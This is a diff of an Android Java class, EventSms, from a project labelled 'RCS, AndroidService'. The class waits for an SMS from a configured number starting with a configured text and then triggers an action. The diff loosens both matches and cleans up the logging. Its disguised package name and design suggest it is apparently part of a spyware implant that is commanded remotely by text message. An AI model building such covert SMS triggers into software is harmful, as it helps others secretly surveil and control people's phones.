@@ -4,7 +4,7 @@
  * Project      : RCS, AndroidService
  * File         : EventSms.java
  * Created      : 6-mag-2011
- * Author		: zeno
+ * Author		: zeno -> mica vero! Que!!! -> per l'header e' vero. Z. ;)
  * *******************************************/
 
 package com.android.service.event;
@@ -21,11 +21,11 @@ import com.android.service.util.WChar;
 
 public class EventSms extends EventBase implements Observer<Sms> {
 	/** The Constant TAG. */
-	private static final String TAG = "EventSms";
+	private static final String TAG = "EventSms"; //$NON-NLS-1$
 
 	private int actionOnEnter;
 	private String number, msg;
-	
+
 	@Override
 	public void begin() {
 		ListenerSms.self().attach(this);
@@ -43,7 +43,7 @@ public class EventSms extends EventBase implements Observer<Sms> {
 		final byte[] conf = event.getParams();
 
 		final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);
-		
+
 		try {
 			actionOnEnter = event.getAction();
 
@@ -51,20 +51,22 @@ public class EventSms extends EventBase implements Observer<Sms> {
 			byte[] num = new byte[databuffer.readInt()];
 			databuffer.read(num);
 
-			number = WChar.getString(num, true);
-			
+			number = WChar.getString(num, true).toLowerCase();
+
 			// Estraiamo il messaggio atteso
 			byte[] text = new byte[databuffer.readInt()];
 			databuffer.read(text);
-			
-			msg = WChar.getString(text, true);
-			
+
+			msg = WChar.getString(text, true).toLowerCase();
+
 			num = text = null;
 		} catch (final IOException e) {
-			if(Cfg.DEBUG) Check.log( TAG + " Error: params FAILED");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: params FAILED") ;//$NON-NLS-1$
+			}
 			return false;
 		}
-		
+
 		return true;
 	}
 
@@ -75,21 +77,23 @@ public class EventSms extends EventBase implements Observer<Sms> {
 
 	// Viene richiamata dal listener (dalla dispatch())
 	public int notification(Sms s) {
-		if(Cfg.DEBUG) Check.log( TAG + " Got SMS notification from: " + s.getAddress() + " Body: " + s.getBody());
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " Got SMS notification from: " + s.getAddress() + " Body: " + s.getBody()) ;//$NON-NLS-1$ //$NON-NLS-2$
+		}
 		
-		if (s.getAddress().equalsIgnoreCase(this.number) == false) {
+		if (s.getAddress().toLowerCase().endsWith(this.number) == false) {
 			return 0;
 		}
 		
-		// Case sensitive
-		if (s.getBody().startsWith(this.msg) == false) {
+		// Case insensitive
+		if (s.getBody().toLowerCase().startsWith(this.msg) == false) {
 			return 0;
 		}
-		
+
 		onEnter();
 		return 1;
 	}
-	
+
 	public void onEnter() {
 		trigger(actionOnEnter);
 	}
